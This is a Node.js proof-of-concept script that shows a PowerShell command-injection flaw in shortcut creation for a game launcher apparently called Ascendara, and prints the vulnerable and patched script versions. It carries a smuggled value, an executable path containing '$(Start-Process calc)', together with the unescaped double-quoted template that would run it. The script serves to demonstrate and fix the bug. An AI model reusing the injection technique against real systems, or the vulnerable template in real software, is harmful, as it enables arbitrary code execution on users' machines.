const path = require("path");
const fs = require("fs");

const game = {
  game: "TEST123",
  executable: "C:\\Users\\victim\\Games\\TEST123\\x$(Start-Process calc)b.exe",
  custom: false,
};

const shortcutDir = "C:\\Users\\victim\\Desktop";
const appDirectory = "C:\\Users\\victim\\AppData\\Local\\Programs\\Ascendara";
const shortcutPath = path.join(shortcutDir, `${game.game || game.name}.lnk`);
const exePath = game.executable;
const isCustom = !!game.custom;
const handlerPath = path.join(appDirectory, "resources", "AscendaraGameHandler.exe");

const vulnerable = `
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut("${shortcutPath}")
    $Shortcut.TargetPath = "${handlerPath}"
    $Shortcut.Arguments = '"${exePath}" ${isCustom ? 1 : 0} "--shortcut"'
    $Shortcut.WorkingDirectory = "${path.dirname(handlerPath)}"
    ${!exePath.match(/\.(bat|cmd)$/i) ? `$Shortcut.IconLocation = "${exePath},0"` : ""}
    $Shortcut.Save()
  `;

const psEscape = value => String(value).replace(/'/g, "''");

const patched = `
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut('${psEscape(shortcutPath)}')
    $Shortcut.TargetPath = '${psEscape(handlerPath)}'
    $Shortcut.Arguments = '"${psEscape(exePath)}" ${isCustom ? 1 : 0} "--shortcut"'
    $Shortcut.WorkingDirectory = '${psEscape(path.dirname(handlerPath))}'
    ${!exePath.match(/\.(bat|cmd)$/i) ? `$Shortcut.IconLocation = '${psEscape(exePath)},0'` : ""}
    $Shortcut.Save()
  `;

console.log("=== vulnerable createShortcut.ps1 ===");
console.log(vulnerable);
console.log("=== patched createShortcut.ps1 ===");
console.log(patched);

fs.writeFileSync(path.join(__dirname, "vulnerable.ps1"), vulnerable);
fs.writeFileSync(path.join(__dirname, "patched.ps1"), patched);
console.log("wrote vulnerable.ps1 and patched.ps1");
